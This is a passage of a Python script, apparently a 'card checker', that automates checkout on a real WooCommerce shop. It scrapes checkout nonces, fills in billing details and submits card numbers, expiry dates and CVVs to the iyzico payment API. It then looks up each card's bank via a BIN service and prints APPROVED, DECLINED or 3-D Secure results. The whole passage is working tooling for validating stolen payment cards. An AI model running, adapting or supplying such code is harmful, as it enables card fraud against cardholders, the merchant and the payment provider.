sip = re.search(r'"update_order_review_nonce":"([^"]+)"', response.text).group(1)
cheoutk = re.search(r'id="woocommerce-process-checkout-nonce"[^>]+value="([^"]+)"', response.text).group(1)
if not cheoutk and sip:
	print("hata var security ve checokut nonce alinmadi")
else:
	pass
import requests

url = "https://www.hmswashing.com"

params = {
  'wc-ajax': "update_order_review"
}

payload = f"security={sip}&payment_method=iyzico&country=TR&state=TR{plaka}&postcode={posta_kodu}&city={il}&address={adres}&address_2=&s_country=TR&s_state=TR{plaka}&s_postcode={posta_kodu}&s_city={il}&s_address={adres}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type=referral&wc_order_attribution_referrer=android-app://org.telegram.messenger/&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=org.telegram.messenger&wc_order_attribution_utm_medium=referral&wc_order_attribution_utm_content=/&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https://www.hmswashing.com/shop&wc_order_attribution_session_start_time={guncel_zaman}&wc_order_attribution_session_pages=13&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user_agent}&billing_first_name={isim}&billing_last_name={soyisim}&billing_company=&billing_country=TR&billing_address_1={adres}&billing_address_2=&billing_postcode={posta_kodu}&billing_city={il}&billing_state=TR{plaka}&billing_phone={telefon}&billing_email={email}&shipping_first_name={isim}&shipping_last_name={soyisim}&shipping_company=&shipping_country=TR&shipping_address_1={adres}&shipping_address_2=&shipping_postcode={posta_kodu}&shipping_city={il}&shipping_state=TR{plaka}&order_comments=&shipping_method[0]=wbs:3:175073e2_courier_free&payment_method=iyzico&mailpoet_woocommerce_checkout_optin_present=1&terms-field=1&woocommerce-process-checkout-nonce={cheoutk}&_wp_http_referer=/checkout&shipping_method[0]=wbs:3:175073e2_courier_free"

headers = {
  'User-Agent': user_agent,
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'Content-Type': "application/x-www-form-urlencoded",
  'sec-ch-ua-platform': "\"Android\"",
  'x-requested-with': "XMLHttpRequest",
  'sec-ch-ua': "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
  'sec-ch-ua-mobile': "?0",
  'origin': "https://www.hmswashing.com",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://www.hmswashing.com/checkout",
  'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
  'priority': "u=1, i",
}

response = mute.post(url, params=params, data=payload, headers=headers)
url = "https://www.hmswashing.com"

params = {
  'wc-ajax': "checkout"
}

payload = f"wc_order_attribution_source_type=referral&wc_order_attribution_referrer=android-app://org.telegram.messenger/&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=org.telegram.messenger&wc_order_attribution_utm_medium=referral&wc_order_attribution_utm_content=/&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https://www.hmswashing.com/shop&wc_order_attribution_session_start_time={guncel_zaman}&wc_order_attribution_session_pages=13&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user_agent}&billing_first_name={isim}&billing_last_name={soyisim}&billing_company=&billing_country=TR&billing_address_1={adres}&billing_address_2=&billing_postcode={posta_kodu}&billing_city={il}&billing_state=TR{plaka}&billing_phone={telefon}&billing_email={email}&shipping_first_name={isim}&shipping_last_name={soyisim}&shipping_company=&shipping_country=TR&shipping_address_1={adres}&shipping_address_2=&shipping_postcode={posta_kodu}&shipping_city={il}&shipping_state=TR{plaka}&order_comments=&shipping_method[0]=wbs:3:175073e2_courier_free&payment_method=iyzico&mailpoet_woocommerce_checkout_optin_present=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce={cheoutk}&_wp_http_referer=/??wc-ajax=update_order_review"

headers = {
  'User-Agent':user_agent,
  'Accept': "application/json, text/javascript, */*; q=0.01",
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'Content-Type': "application/x-www-form-urlencoded",
  'sec-ch-ua-platform': "\"Android\"",
  'x-requested-with': "XMLHttpRequest",
  'sec-ch-ua': "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
  'sec-ch-ua-mobile': "?0",
  'origin': "https://www.hmswashing.com",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://www.hmswashing.com/checkout",
  'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
  'priority': "u=1, i",
}

response = mute.post(url, params=params, data=payload, headers=headers)
redirect_url = response.json()["redirect"]
headers = {
  'User-Agent':user_agent,
  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  'sec-ch-ua': "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
  'sec-ch-ua-mobile': "?0",
  'sec-ch-ua-platform': "\"Android\"",
  'upgrade-insecure-requests': "1",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "navigate",
  'sec-fetch-dest': "document",
  'referer': "https://www.hmswashing.com/checkout",
  'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
  'priority': "u=0, i",
}

response = mute.get(redirect_url,headers=headers)
token = re.search(r'token:"([^"]+)"', response.text).group(1)
price = re.search(r'price:([0-9.]+)', response.text).group(1)
current_currency = re.search(r'currency:"([^"]+)"', response.text).group(1)
url = "https://api.iyzipay.com/payment/iyzipos/checkoutform/auth/ecom"

payload = json.dumps({
  "installment": 1,
  "paidPrice":price,
  "paymentChannel": "MOBILE_ANDROID",
  "paymentCard": {
    "cardNumber": cardnumber,
    "cardHolderName": f"{isim} {soyisim}",
    "expireYear":year,
    "expireMonth":exp,
    "cvc": cvv,
    "registerConsumerCard": False,
    "registerCard": 0
  },
  "browserFingerprint": {
    "language": "tr",
    "timezone": -180,
    "hasSessionStorage": True,
    "hasLocalStorage": True,
    "hasIndexedDb": True,
    "hasOpenDb": True,
    "platform": "False",
    "hasLiedLanguage": False,
    "hasLiedResolution": False,
    "hasLiedOS": False,
    "hasLiedBrowser": False,
    "maxTouchPoints": 0,
    "touchEventSuccess": False,
    "hasTouchStart": False,
    "fingerprintHash": ""
  }
})

headers = {
  'User-Agent': user_agent,
  'Accept': "application/json",
  'Content-Type': "application/json",
  'X-IYZI-TOKEN':token,
  'sec-ch-ua-platform': "\"Android\"",
  'sec-ch-ua': "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
  'sec-ch-ua-mobile': "?0",
  'Origin': "https://www.hmswashing.com",
  'Sec-Fetch-Site': "cross-site",
  'Sec-Fetch-Mode': "cors",
  'Sec-Fetch-Dest': "empty",
  'Referer': "https://www.hmswashing.com/",
  'Accept-Language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
}

response = requests.post(url, data=payload, headers=headers)
iyizico = json.loads(response.text)
try:
    # Extract first 6 digits of card number
    bin_number = cardnumber[:6]
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    headers = {
        'Accept-Version': "3",
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    bin_response = requests.get(url, headers=headers)
    bin_data = bin_response.json()
    
    scheme = bin_data.get('brand', 'Unknown')
    type_ = bin_data.get('type', 'Unknown')
    brand = bin_data.get('level', 'Unknown')
    bank = bin_data.get('bank', 'Unknown')
    country = bin_data.get('country_name', 'Unknown')
    emoji = bin_data.get('country_flag', '')
except Exception as e:
    print(f"❌ Error: {e}")
süre = round(time.time() - start_time, 2)
if "threeDSHtmlContent" in iyizico:
    # 3-D Secure durumu
    print("\n🔒 3-D SECURE REQUIRED ⚠️")
    print("━"*39)
    print(f"💳 𝗖𝗮𝗿𝗱: {kart_bilgisi}")
    print(f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: İyizico {price} {current_currency}")
    print(f"📥 𝐑𝐞𝐬𝐩𝐨𝐧𝘀𝐞: 3-D Secure Required")
    print(f"🏦 𝗦𝗰𝗵𝗲𝗺𝗲: {scheme} - {type_} - {brand}")
    print(f"🏛️ 𝗕𝗮𝗻𝗸: {bank}")
    print(f"🌎 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {emoji}")
    print(f"⏱️ 𝗧𝗶𝗺𝗲: {süre} seconds")
    print("━"*39)

elif iyizico["status"] == "success":
    print("\n🌠 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅ ")
    print("━"*39)
    print(f"💳 𝗖𝗮𝗿𝗱: {kart_bilgisi}")
    print(f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: İyizico {price} {current_currency}")
    print(f"📥 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {iyizico['status']}")
    print(f"🏦 𝗦𝗰𝗵𝗲𝗺𝗲: {scheme} - {type_} - {brand}")
    print(f"🏛️ 𝗕𝗮𝗻𝗸: {bank}")
    print(f"🌎 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {emoji}")
    print(f"⏱️ 𝗧𝗶𝗺𝗲: {süre} seconds")
    print("━"*39)

else:
    print("\n❌ 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌")
    print("━"*39)
    print(f"💳 𝗖𝗮𝗿𝗱: {kart_bilgisi}")
    print(f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: İyizico {price} {current_currency}")
    print(f"📥 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {iyizico.get('errorCode')} : {iyizico.get('errorMessage')} (TR) / {iyizico.get('errorGroup')} (EN)")
    print(f"🏦 𝗦𝗰𝗵𝗲𝗺𝗲: {scheme} - {type_} - {brand}")
    print(f"🏛️ 𝗕𝗮𝗻𝗸: {bank}")
    print(f"🌎 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {emoji}")
    print(f"⏱️ 𝗧𝗶𝗺𝗲: {süre} seconds")
    print("━"*39)